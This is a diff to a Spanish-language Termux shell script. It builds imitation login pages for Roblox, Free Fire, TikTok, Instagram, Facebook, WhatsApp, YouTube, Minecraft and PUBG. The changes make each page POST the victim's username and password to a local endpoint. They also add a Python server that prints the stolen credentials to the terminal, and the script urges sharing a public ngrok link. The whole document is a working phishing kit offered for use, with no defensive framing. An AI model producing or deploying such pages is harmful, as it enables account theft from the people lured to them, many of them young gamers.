@@ -85,11 +85,12 @@ function enviarDatos(e) {
     const usuario = document.getElementById('usuario').value;
     const password = document.getElementById('password').value;
     
-    console.log('📤 DATOS ENVIADOS:');
-    console.log('Usuario:', usuario);
-    console.log('Contraseña:', password);
-    console.log('App: Roblox');
-    console.log('Fecha:', new Date().toLocaleString());
+    // Enviar datos al servidor (Termux)
+    fetch('/submit', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+        body: 'app=Roblox&usuario=' + encodeURIComponent(usuario) + '&password=' + encodeURIComponent(password)
+    });
     
     document.getElementById('successMsg').classList.add('show');
     document.getElementById('formData').reset();
@@ -166,11 +167,11 @@ function enviarDatos(e) {
     const usuario = document.getElementById('usuario').value;
     const password = document.getElementById('password').value;
     
-    console.log('📤 DATOS ENVIADOS:');
-    console.log('ID:', usuario);
-    console.log('Contraseña:', password);
-    console.log('App: Free Fire');
-    console.log('Fecha:', new Date().toLocaleString());
+    fetch('/submit', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+        body: 'app=FreeFire&usuario=' + encodeURIComponent(usuario) + '&password=' + encodeURIComponent(password)
+    });
     
     document.getElementById('successMsg').classList.add('show');
     document.getElementById('formData').reset();
@@ -247,11 +248,11 @@ function enviarDatos(e) {
     const usuario = document.getElementById('usuario').value;
     const password = document.getElementById('password').value;
     
-    console.log('📤 DATOS ENVIADOS:');
-    console.log('Usuario:', usuario);
-    console.log('Contraseña:', password);
-    console.log('App: TikTok');
-    console.log('Fecha:', new Date().toLocaleString());
+    fetch('/submit', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+        body: 'app=TikTok&usuario=' + encodeURIComponent(usuario) + '&password=' + encodeURIComponent(password)
+    });
     
     document.getElementById('successMsg').classList.add('show');
     document.getElementById('formData').reset();
@@ -326,11 +327,11 @@ function enviarDatos(e) {
     const usuario = document.getElementById('usuario').value;
     const password = document.getElementById('password').value;
     
-    console.log('📤 DATOS ENVIADOS:');
-    console.log('Usuario:', usuario);
-    console.log('Contraseña:', password);
-    console.log('App: Instagram');
-    console.log('Fecha:', new Date().toLocaleString());
+    fetch('/submit', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+        body: 'app=Instagram&usuario=' + encodeURIComponent(usuario) + '&password=' + encodeURIComponent(password)
+    });
     
     document.getElementById('successMsg').classList.add('show');
     document.getElementById('formData').reset();
@@ -405,11 +406,11 @@ function enviarDatos(e) {
     const usuario = document.getElementById('usuario').value;
     const password = document.getElementById('password').value;
     
-    console.log('📤 DATOS ENVIADOS:');
-    console.log('Correo/Teléfono:', usuario);
-    console.log('Contraseña:', password);
-    console.log('App: Facebook');
-    console.log('Fecha:', new Date().toLocaleString());
+    fetch('/submit', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+        body: 'app=Facebook&usuario=' + encodeURIComponent(usuario) + '&password=' + encodeURIComponent(password)
+    });
     
     document.getElementById('successMsg').classList.add('show');
     document.getElementById('formData').reset();
@@ -485,11 +486,11 @@ function enviarDatos(e) {
     const usuario = document.getElementById('usuario').value;
     const password = document.getElementById('password').value;
     
-    console.log('📤 DATOS ENVIADOS:');
-    console.log('Número:', usuario);
-    console.log('Código:', password);
-    console.log('App: WhatsApp');
-    console.log('Fecha:', new Date().toLocaleString());
+    fetch('/submit', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+        body: 'app=WhatsApp&usuario=' + encodeURIComponent(usuario) + '&password=' + encodeURIComponent(password)
+    });
     
     document.getElementById('successMsg').classList.add('show');
     document.getElementById('formData').reset();
@@ -565,11 +566,11 @@ function enviarDatos(e) {
     const usuario = document.getElementById('usuario').value;
     const password = document.getElementById('password').value;
     
-    console.log('📤 DATOS ENVIADOS:');
-    console.log('Correo:', usuario);
-    console.log('Contraseña:', password);
-    console.log('App: YouTube');
-    console.log('Fecha:', new Date().toLocaleString());
+    fetch('/submit', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+        body: 'app=YouTube&usuario=' + encodeURIComponent(usuario) + '&password=' + encodeURIComponent(password)
+    });
     
     document.getElementById('successMsg').classList.add('show');
     document.getElementById('formData').reset();
@@ -645,11 +646,11 @@ function enviarDatos(e) {
     const usuario = document.getElementById('usuario').value;
     const password = document.getElementById('password').value;
     
-    console.log('📤 DATOS ENVIADOS:');
-    console.log('Correo:', usuario);
-    console.log('Contraseña:', password);
-    console.log('App: Minecraft');
-    console.log('Fecha:', new Date().toLocaleString());
+    fetch('/submit', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+        body: 'app=Minecraft&usuario=' + encodeURIComponent(usuario) + '&password=' + encodeURIComponent(password)
+    });
     
     document.getElementById('successMsg').classList.add('show');
     document.getElementById('formData').reset();
@@ -725,11 +726,11 @@ function enviarDatos(e) {
     const usuario = document.getElementById('usuario').value;
     const password = document.getElementById('password').value;
     
-    console.log('📤 DATOS ENVIADOS:');
-    console.log('ID:', usuario);
-    console.log('Contraseña:', password);
-    console.log('App: PUBG Mobile');
-    console.log('Fecha:', new Date().toLocaleString());
+    fetch('/submit', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+        body: 'app=PUBG&usuario=' + encodeURIComponent(usuario) + '&password=' + encodeURIComponent(password)
+    });
     
     document.getElementById('successMsg').classList.add('show');
     document.getElementById('formData').reset();
@@ -741,6 +742,59 @@ function enviarDatos(e) {
 </body>
 </html>
 EOF
+}
+
+# ============================================
+# SERVIDOR HTTP CON PYTHON PARA RECIBIR DATOS
+# ============================================
+start_server() {
+    cd ~/mi_web
+    python3 << 'PYTHON_SCRIPT'
+import http.server
+import socketserver
+import urllib.parse
+import datetime
+
+PORT = 8080
+
+class MyHandler(http.server.SimpleHTTPRequestHandler):
+    def do_POST(self):
+        if self.path == '/submit':
+            content_length = int(self.headers['Content-Length'])
+            post_data = self.rfile.read(content_length)
+            data = urllib.parse.parse_qs(post_data.decode('utf-8'))
+            
+            app = data.get('app', ['Desconocido'])[0]
+            usuario = data.get('usuario', [''])[0]
+            password = data.get('password', [''])[0]
+            
+            print("\n" + "="*50)
+            print("📥 NUEVOS DATOS RECIBIDOS")
+            print("="*50)
+            print(f"📱 App: {app}")
+            print(f"👤 Usuario: {usuario}")
+            print(f"🔑 Contraseña: {password}")
+            print(f"🕐 Hora: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+            print("="*50 + "\n")
+            
+            self.send_response(200)
+            self.send_header('Content-type', 'application/json')
+            self.end_headers()
+            self.wfile.write(b'{"status":"ok"}')
+        else:
+            self.send_response(404)
+            self.end_headers()
+    
+    def do_GET(self):
+        if self.path == '/':
+            self.path = '/index.html'
+        return http.server.SimpleHTTPRequestHandler.do_GET(self)
+
+print("🚀 Servidor iniciado en el puerto 8080")
+print("📡 Esperando datos...")
+with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
+    httpd.serve_forever()
+PYTHON_SCRIPT
 }
 
 # ============================================
@@ -841,6 +895,7 @@ if [ "$net_choice" == "2" ]; then
     if [ -n "$NGROK_URL" ]; then
         echo -e "${AMARILLO}  📎 $NGROK_URL${NC}"
         echo -e "${BLANCO}  (¡Cualquier persona en el mundo puede acceder!)${NC}"
+        echo -e "${VERDE}  ✅ Comparte este link para que otros accedan${NC}"
     else
         echo -e "${ROJO}  ❌ Error al generar enlace público${NC}"
         echo -e "${AMARILLO}  Usando localhost en su lugar...${NC}"
@@ -863,5 +918,10 @@ if [ "$net_choice" == "1" ]; then
     echo -e "${BLANCO}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n"
 fi
 
+echo -e "${VERDE}📥 Los datos enviados aparecerán en esta terminal${NC}"
 echo -e "${BLANCO}Presiona Ctrl+C para detener el servidor.${NC}\n"
-cd ~/mi_web && python3 -m http.server 8080
+
+# ============================================
+# INICIAR SERVIDOR CON PYTHON
+# ============================================
+start_server
